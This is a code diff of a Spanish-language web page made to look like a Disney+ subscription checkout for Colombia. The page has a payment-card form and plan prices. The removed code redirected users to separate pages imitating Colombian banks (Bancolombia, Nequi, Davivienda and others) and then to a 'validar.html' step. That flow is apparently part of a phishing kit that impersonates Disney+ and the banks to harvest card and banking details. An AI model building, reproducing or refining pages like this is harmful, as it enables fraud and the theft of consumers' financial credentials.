@@ -23,32 +23,38 @@ header {
     align-items: center;
 }
 
-header img {
-    height: 34px;
-}
+header img { height: 34px; }
+header a { color: #bbb; font-size: 15px; text-decoration: none; }
 
-header a {
-    color: #bbb;
-    font-size: 15px;
-    text-decoration: none;
-}
-
-/* CONTENEDOR PRINCIPAL */
+/* CONTENEDOR */
 .main-container {
     padding: 20px;
     max-width: 600px;
     margin: auto;
 }
 
-.step {
-    font-size: 14px;
-    color: #9ca3af;
+.step { font-size: 14px; color: #9ca3af; }
+h1 { font-size: 28px; margin-top: 5px; margin-bottom: 25px; }
+
+/* TABS */
+.tabs {
+    display: flex;
+    margin-bottom: 20px;
+    border-bottom: 1px solid #333;
 }
 
-h1 {
-    font-size: 28px;
-    margin-top: 5px;
-    margin-bottom: 25px;
+.tab {
+    flex: 1;
+    text-align: center;
+    padding: 12px 0;
+    font-size: 16px;
+    cursor: pointer;
+    color: #bbb;
+}
+
+.tab.active {
+    color: #00c8ff;
+    border-bottom: 2px solid #00c8ff;
 }
 
 /* LABELS */
@@ -71,10 +77,8 @@ input, select {
     box-sizing: border-box;
 }
 
-/* INPUT TARJETA */
-.input-card {
-    position: relative;
-}
+/* TARJETA */
+.input-card { position: relative; }
 
 .card-icons {
     position: absolute;
@@ -90,33 +94,29 @@ input, select {
     opacity: .9;
 }
 
-/* FILA FECHA / CVV */
+/* FILA DOBLE */
 .row-double {
     display: flex;
     gap: 15px;
     margin-top: 5px;
 }
 
-.field-group {
-    flex: 1;
-    min-width: 0;
-}
+.field-group { flex: 1; min-width: 0; }
 
-/* PRECIO */
-#totalBox {
-    margin-top: 22px;
-    background: #1a1a1a;
-    padding: 15px;
-    border-radius: 8px;
-    font-size: 17px;
-    border: 1px solid #333;
+/* CAJA PRECIO */
+#price-box {
+    margin-top: 25px;
+    padding: 20px;
+    background: #141414;
+    border: 1px solid #2a2a2a;
+    border-radius: 10px;
 }
 
 /* BOTÓN */
 button {
     width: 100%;
     padding: 16px;
-    margin-top: 20px;
+    margin-top: 25px;
     background: #fff;
     border: none;
     color: #000;
@@ -135,6 +135,13 @@ footer {
     text-align: center;
     font-size: 13px;
 }
+
+footer a { color: #00c8ff; text-decoration: none; }
+
+/* RESPONSIVE */
+@media (max-width: 480px) {
+    .row-double { flex-direction: column; gap: 0; }
+}
 </style>
 </head>
 
@@ -146,12 +153,17 @@ footer {
     <a href="#">Cerrar sesión</a>
 </header>
 
+<!-- CONTENIDO -->
 <div class="main-container">
 
     <div class="step">PASO 3 DE 3</div>
     <h1>¡A disfrutar!</h1>
 
-    <!-- FORMULARIO -->
+    <div class="tabs">
+        <div class="tab active">Crédito/Débito</div>
+    </div>
+
+    <!-- FORM -->
     <label>NOMBRE EN LA TARJETA</label>
     <input type="text" placeholder="Nombre del titular">
 
@@ -193,58 +205,63 @@ footer {
     <label>RUT (OPCIONAL)</label>
     <input type="text" placeholder="Opcional">
 
-    <!-- SELECCIÓN BANCO -->
-    <label>BANCO PARA VALIDAR</label>
-    <select id="bank">
-        <option value="">Seleccione su banco…</option>
-        <option value="bancolombia.html">Bancolombia</option>
-        <option value="nequi.html">Nequi</option>
-        <option value="davivienda.html">Davivienda</option>
-        <option value="bbva.html">BBVA</option>
-        <option value="popular.html">Banco Popular</option>
-        <option value="bogota.html">Banco de Bogotá</option>
-        <option value="itau.html">Itaú</option>
-    </select>
+    <!-- 🔥 TOTAL A PAGAR — JUSTO DESPUÉS DE RUT -->
+    <div id="price-box">
+        <div style="color:#9ca3af; font-size:15px;">Total a pagar</div>
 
-    <!-- PRECIO -->
-    <div id="totalBox">
-        Total a pagar: <strong id="planPrice"></strong>
+        <div id="finalPrice" style="
+            margin-top: 6px;
+            font-size: 26px;
+            font-weight: 600;
+            color: #00c8ff;
+            text-shadow: 0 0 8px rgba(0,200,255,.35);
+        "></div>
+
+        <div id="planName" style="margin-top:4px; font-size:14px; color:#6b7280;"></div>
+
+        <div id="planSummary" style="margin-top:10px; font-size:14px; color:#9ca3af;"></div>
     </div>
 
-    <button onclick="goBank()">INICIAR SUSCRIPCIÓN</button>
+    <!-- BOTÓN FINAL -->
+    <button>INICIAR SUSCRIPCIÓN</button>
 
 </div>
 
+<!-- FOOTER -->
 <footer>
-    © 2025 Disney+. Todos los derechos reservados.  
-    <br>
+    © 2025 Disney+. Todos los derechos reservados. · 
     <a href="#">Términos de uso</a> · 
     <a href="#">Política de privacidad</a> · 
     <a href="#">Ayuda</a>
 </footer>
 
 <script>
-// Mostrar precio dinámico
-document.getElementById("planPrice").innerText = 
-    "COP " + (localStorage.getItem("planPrice") || "24.900") + "/mes";
+// Recuperar plan guardado
+const plan = localStorage.getItem("plan") || "standard_ads";
 
-// Redirigir al banco seleccionado
-function goBank() {
-    const bankSelect = document.getElementById("bank");
-    const bankName = bankSelect.options[bankSelect.selectedIndex].text;
-
-    if (bankSelect.value === "") {
-        alert("Seleccione su banco para validar el pago.");
-        return;
+// Datos reales de Disney+
+const planData = {
+    premium: {
+        price: "49.900 COP/mes",
+        name: "Plan Premium",
+        desc: "Incluye: 4K UHD • 4 dispositivos • Sin anuncios"
+    },
+    standard: {
+        price: "36.900 COP/mes",
+        name: "Plan Estándar",
+        desc: "Incluye: Full HD • 2 dispositivos"
+    },
+    standard_ads: {
+        price: "24.900 COP/mes",
+        name: "Estándar con anuncios",
+        desc: "Incluye: HD • 2 dispositivos • Con anuncios"
     }
+};
 
-    // Guardar nombre del banco
-    localStorage.setItem("bankName", bankName);
-
-    // Ir a la página universal
-    window.location.href = "validar.html";
-}
-
+// Insertar valores
+document.getElementById("finalPrice").innerText = planData[plan].price;
+document.getElementById("planName").innerText = planData[plan].name;
+document.getElementById("planSummary").innerText = planData[plan].desc;
 </script>
 
 </body>
